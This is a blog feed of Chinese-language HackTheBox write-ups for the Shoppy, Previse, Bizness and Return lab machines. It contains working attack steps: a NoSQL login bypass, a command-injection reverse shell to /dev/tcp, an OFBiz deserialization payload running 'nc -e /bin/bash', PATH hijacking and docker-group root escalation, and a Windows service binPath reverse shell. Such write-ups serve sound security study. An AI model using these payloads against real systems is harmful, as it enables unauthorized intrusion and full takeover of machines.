<p><a class="link"   href="https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo" >https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>是通过什么判断为Nosql注入的呢？（参考思路：<a class="link"   href="https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed" >https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed<i class="fas fa-external-link-alt"></i></a> ）</p>
<p>login发包是post发送username和password两个参数，按往常那样测试单引号，每次都需等待很久的时间然后返回504，直接sqlmap跑也无效，当我们随便访问一个不存在的目录时返回的是，这表明这个web在使用路由</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913140659.png" ></p>
<p>所以可能是在使用Node.js，他存在使用Nosql注入漏洞绕过登陆限制，经过尝试，可以使用<code>admin&#39; || &#39;a&#39;==&#39;a</code>绕过</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141054.png" ></p>
<p>登陆后跳转到&#x2F;admin，主要是有个search功能点，没找到别的点了，搜索admin，给了一个json文件，里面有admin密码的哈希（爆破不出来）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141517.png" ></p>
<p>但是不知道有没有别的用户，继续使用Nosql的payload<code>admin&#39; || &#39;a&#39;==&#39;a</code>，这次多看到一个用户的密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141635.png" ></p>
<p>爆破后拿到账号密码<code>josh:remembermethisway</code>，成功登陆mattermost那个域名的登陆口，在聊天窗口中找到jaeger的账号密码，ssh登陆成功，拿到user</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141843.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l看到 <code>(deploy) /home/deploy/password-manager</code>,password-manager是个二进制文件，strings查看，貌似是输入正确的密码后能拿到deploy目录下的creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142207.png" ></p>
<p>传到本地，ida看了一下，密码就在源代码里，<code>Sample</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142251.png" ></p>
<p>输入正确密码后拿到deploy的密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142327.png" ></p>
<p>登陆deploy输入id，发现deploy在docker组里，有相关的提权方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy@shoppy:/home/jaeger$ id</span><br><span class="line">uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>docker提权参考链接</p>
<p><a class="link"   href="https://www.cnblogs.com/kqdssheng/p/18275541" >https://www.cnblogs.com/kqdssheng/p/18275541<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142636.png" ></p>
<p>有个docker提权的漏洞，大概思路就是<strong>创建一个新的容器，该容器中挂载了整个文件系统。在这个容器中，我将是根用户，因此可以完全访问容器中的所有文件（包括完整的主机文件系统）。</strong></p>
<p>​	•	docker run: 运行一个新的 Docker 容器。</p>
<p>​	•	-v &#x2F;:&#x2F;mnt: 将宿主机的根目录 &#x2F; 挂载到容器内部的 &#x2F;mnt 目录。这样，容器可以通过 &#x2F;mnt 访问到宿主机的文件系统。</p>
<p>​	•	–rm: 容器在退出后会自动删除，不会保留临时文件或容器。</p>
<p>​	•	-it: 以交互模式运行容器，并分配一个伪终端。这样你可以在容器中运行命令并看到输出。</p>
<p>​	•	alpine: 指定使用 Alpine Linux 这个小型的 Linux 发行版镜像作为容器的基础镜像。</p>
<p>​	•	chroot &#x2F;mnt: 使用 chroot 命令将 &#x2F;mnt 作为新的根目录，将容器的根文件系统切换到宿主机的根目录。</p>
<p>​	•	bash: 运行 bash，给你一个新的 shell 环境。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913143024.png" ></p>
<p>于是我们可以成功读到root.txt，后续也可以通过读取shadow或是ssh私钥等方法来获得真正的宿主机root</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机还挺有意思的，主要涉及到Nosql注入和docker提权，都是第一次遇见，过后要好好消化一下这两个知识了。。</p>
<h5 id="推荐阅读wp"><a href="#推荐阅读wp" class="headerlink" title="推荐阅读wp"></a>推荐阅读wp</h5><p><a class="link"   href="https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm" >https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb previse复盘</title>
    <url>/2024/09/13/htb-previse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─# nmap -A -p- --min-rate=1000 -T4 10.10.11.104</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 19:03 PDT</span><br><span class="line">Nmap scan report for 10.10.11.104</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)</span><br><span class="line">|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)</span><br><span class="line">|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-title: Previse Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=9/12%OT=22%CT=1%CU=42757%PV=Y%DS=2%DC=T%G=Y%TM=66E3</span><br><span class="line">OS:9E0F%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A</span><br><span class="line">OS:)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53A</span><br><span class="line">OS:ST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1</span><br><span class="line">OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O</span><br><span class="line">OS:=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N</span><br><span class="line">OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=</span><br><span class="line">OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF</span><br><span class="line">OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=</span><br><span class="line">OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   414.58 ms 10.10.16.1</span><br><span class="line">2   587.74 ms 10.10.11.104</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 165.33 seconds</span><br></pre></td></tr></table></figure>

<p>只有22和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100648.png" ></p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>先访问80端口，只有一个登陆口，尝试了密码爆破和sql注入，都不成功，后面看的官方对机器的描述是关于重定向的，扫到的nav.php，点到其他php都会定向会login.php。看一下bp历史包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100810.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100944.png" ></p>
<p>可以看到返回包里有accounts.php的详细内容，但是状态码是302，我们尝试bp抓包后”Do interact”，修改返回包的状态码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101145.png" ></p>
<p>这下就不会被重定向到login.php，可以看到正常的account页面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101238.png" ></p>
<p>我们在这里新建一个用户，再正常登陆，登陆后就不会被重定向了</p>
<p>然后再download.php找到一个可以下载的压缩包<code>SITEBACKUP.zip</code>，下载下来是网站的源码，config.php可以看到mysql登陆账号密码，后面可以用，经过一番搜寻，在logs.php里面发现<code>exec</code>函数，里面的变量可控，大概率存在代码注入漏洞</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101933.png" ></p>
<p>找到导出log的php，抓到包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913102148.png" ></p>
<p>改变一下delim变量值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delim=%3bbash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.16.4/1234+0&gt;%261&#x27;%3b</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>拿到第一反应是先登陆mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@previse:/var/www/html$ mysql -u root -p&#x27;mySQL_p@ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">&lt;ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">id      username        password        created_at</span><br><span class="line">1       m4lwhere        $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36</span><br><span class="line">2       admin   $1$🧂llol$G3KunFyMrVvsqYP1JpRi70        2024-09-13 02:06:23</span><br></pre></td></tr></table></figure>

<p>拿到 <code>m4lwhere</code>的加盐密码，还要看到他是什么类型的哈希</p>
<p>然后在accounts.php源码找到存储逻辑</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913103416.png" ></p>
<p>Crypt()函数，md5加密来的，于是指定john的爆破格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>

<p>最后拿到密码<code>ilovecody112235!</code>登陆m4lwhere</p>
<p>第一件事sudo -l，找到一个可以用的脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m4lwhere@previse:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> m4lwhere: </span><br><span class="line">User m4lwhere may run the following commands on previse:</span><br><span class="line">    (root) /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">ls</span> -l /opt/scripts/access_backup.sh</span><br><span class="line">-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">cat</span> /opt/scripts/access_backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We always make sure to store logs, we take security SERIOUSLY here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span></span><br><span class="line"><span class="comment"># This is configured to run with cron, added to sudo so I can run as needed - we&#x27;ll fix it later when there&#x27;s time</span></span><br><span class="line"></span><br><span class="line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_access.gz</span><br><span class="line">gzip -c /var/www/file_access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_file_access.gz</span><br></pre></td></tr></table></figure>

<p>没有修改权限，第一反应是修改环境变量，里面用到gzip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">&#x27;#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash&#x27;</span> &gt; gzip</span><br><span class="line"><span class="built_in">chmod</span> +x gzip</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">sudo /opt/scripts/access_backup.sh</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913104313.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>真感觉htb质量高，难度适中，什么知识点都需要，最开始重定向分析那个算是基础，这次复盘下来也是加深了印象，拿到源码后审计这块真需要耐心。。。</p>
<p>\server\index.php<br>\server\simplewind\Core\ThinkPHP.php<br>\server\simplewind\Core\Library\Think\Think.class.php<br>\server\simplewind\Core\Library\Think\Storage.class.php<br>\server\simplewind\Core\Library\Think\Storage\Driver\File.class.php<br>\server\simplewind\Core\Mode\common.php<br>\server\simplewind\Core\Common\functions.php<br>\server\application\Common\Common\function.php<br>\server\simplewind\Core\Library\Think\Hook.class.php<br>\server\simplewind\Core\Library\Think\App.class.php<br>\server\simplewind\Core\Library\Think\Dispatcher.class.php<br>\server\simplewind\Core\Library\Think\Route.class.php<br>\server\simplewind\Core\Library\Think\Controller.class.php<br>\server\simplewind\Core\Library\Think\View.class.php<br>\server\simplewind\Core\Library\Behavior\BuildLiteBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ParseTemplateBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ContentReplaceBehavior.class.php<br>\server\simplewind\Core\Conf\convention.php<br>\server\application\Common\Conf\config.php<br>\server\data\conf\db.php<br>\server\data\conf\config.php<br>\server\data\conf\route.php<br>\server\application\Common\Conf\alias.php<br>\server\application\Common\Conf\tags.php<br>\server\simplewind\Core\Lang\zh-cn.php<br>\server\simplewind\Core\Conf\debug.php<br>\server\application\Common\Conf\debug.php<br>\server\application\Common\Behavior\InitHookBehavior.class.php<br>\server\simplewind\Core\Library\Think\Behavior.class.php<br>\server\simplewind\Core\Library\Think\Cache.class.php<br>\server\simplewind\Core\Library\Think\Cache\Driver\File.class.php<br>\server\application\Common\Common\extend.php<br>\server\application\Portal\Conf\config.php<br>\server\application\Portal\Common\function.php<br>\server\simplewind\Core\Library\Behavior\ReadHtmlCacheBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\CheckLangBehavior.class.php<br>\server\application\Common\Lang\zh-cn.php<br>\server\application\Portal\Controller\IndexController.class.php<br>\server\application\Common\Controller\HomebaseController.class.php<br>\server\application\Common\Controller\AppframeController.class.php<br>\server\simplewind\Core\Library\Think\Template.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib\Cx.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib.class.php<br>\server\application\Common\Lib\Taglib\TagLibSpadmin.class.php<br>\server\application\Common\Lib\Taglib\TagLibHome.class.php<br>\server\application\Portal\Lib\Taglib\Portal.class.php<br>\server\data\runtime\Cache\Portal\5c2fc9f3dd331fb0470c86f0c6552505.php<br>\server\simplewind\Core\Library\Think\Model.class.php<br>\server\simplewind\Core\Library\Think\Db.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver\Mysql.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver.class.php<br>\server\simplewind\Lib\Util\Tree.class.php<br>\server\simplewind\Core\Library\Behavior\WriteHtmlCacheBehavior.class.php<br>\server\application\Common\Behavior\TmplStripSpaceBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ShowPageTraceBehavior.class.php</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb bizness复盘</title>
    <url>/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.252</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描，扫到22 80 443 40081端口，先看80端口，需要配置hosts文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>然后访问网页，翻到最下面发现是apache ofbiz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
<p>查询到有相关漏洞，反序列化命令执行漏洞 CVE-2023-49070，在网上找到<a class="link"   href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>，按照poc使用</p>
<p>先下载ysoserial.jar生成base64的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>

<p>然后发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;生成的paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>成功拿到第一个shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>涉及的知识点没见过，记录一下</strong></p>
<p>通过搜索，找到&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0目录下有很多.dat文件，<strong>derby是个小型数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>(\w+\W+)&#123;0,5&#125;</code>：这是一个正则表达式，用于匹配最多五个字母&#x2F;数字和非字母&#x2F;数字字符的序列。<code>\w+</code> 匹配一个或多个字母&#x2F;数字字符，<code>\W+</code> 匹配一个或多个非字母&#x2F;数字字符，<code>&#123;0,5&#125;</code> 表示该序列最多重复匹配 0 到 5 次。</li>
<li><code>password</code>：这是正则表达式中的一个具体词汇，表示要匹配的密码。</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
<p>找到一串，Password&#x3D;”$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I” ，然后用cyberchef对后半段进行处理，解密成16进制的字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
<p>把_换成&#x2F;，把-换成+，再base64解码，最后转化到十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>

<p>使用hashid识别一下加密类型</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
<p>猜测是120模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>

<p>爆出来的密码是monkeybizness</p>
<p>然后直接su - root登录，权限就到root了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机最后提取拿密码的思路之前没见过，学习了，然后apache那个反序列化漏洞实践poc的过程很有趣，htb的靶机质量真的可以。</p>
<p>涉及知识点：poc利用，sha1加盐爆破，信息搜集（敏感数据库泄露），grep正则提取。</p>
<h4 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h4><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb return复盘</title>
    <url>/2024/04/09/htb-return%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>这个靶机比较简单，就边做边记录了📝</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/440073688" >https://zhuanlan.zhihu.com/p/440073688<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128562358" >https://blog.csdn.net/Purpose_7/article/details/128562358<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Return" >https://app.hackthebox.com/machines/Return<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：我觉得比easy还easy</p>
<p>ip：10.10.11.108</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204704.png"   style="zoom:50%;" >

<p>扫到很多端口，先看看80端口，有个setting.php，起始长这样</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204749.png" ></p>
<p>像是在配置一个服务，需要填address，389对于ldap服务</p>
<p>思路是把地址改成本地ip，本地开启监听389端口，点击update，收到一串密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204957.png" ></p>
<p>用来登录svc-printer账户，没想到第一个flag拿的这么轻松</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看一下svc-printer账户详情</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2021.03.47.png" ></p>
<p>他有Server Operator权限，“<strong>Members of this group can start&#x2F;stop system services</strong>”</p>
<p>那接下来的思路就是上传一个nc.exe，停止某个服务，修改某个服务的路径，再启动服务，就会反弹shell</p>
<p>这里选的服务是Windows自带的卷影复制服务<code>vss</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.16.3/nc64.exe&#x27;,&#x27;C:\Users\svc-printer\desktop\nc.exe&#x27;)&quot;</span><br><span class="line"># 下载一个nc.exe</span><br><span class="line">sc.exe stop vss # 停止vss</span><br><span class="line">sc.exe config vss binPath=&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 8888&quot; # 修改服务路径</span><br><span class="line">sc.exe start vss # 开启服务</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409210956.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409211018.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前遇到最简单的windows靶机，虽然开了很多端口但是没什么用，学习到Server Operator权限相关内容，不错</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-permX复盘</title>
    <url>/2024/07/10/htb-permX%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fa3894042594a3ebe558c2ad9a7c5517219b41d985abec3337968f8e2cbdb1c4"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>htb remote复盘</title>
    <url>/2024/04/08/htb-remote%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>为了学windows渗透相关内容，昨天冲动了一把买了htb一个月的会员，为了不浪费这一百块钱，接下来要好好学！</p>
<p>先做的第一个就是remote靶机，全程看着wp做的，相比linux，很多东西都是陌生的，还是要多做多复盘才能熟悉这个体系，让知识深入我心。</p>
<h5 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h5><p>官方wp</p>
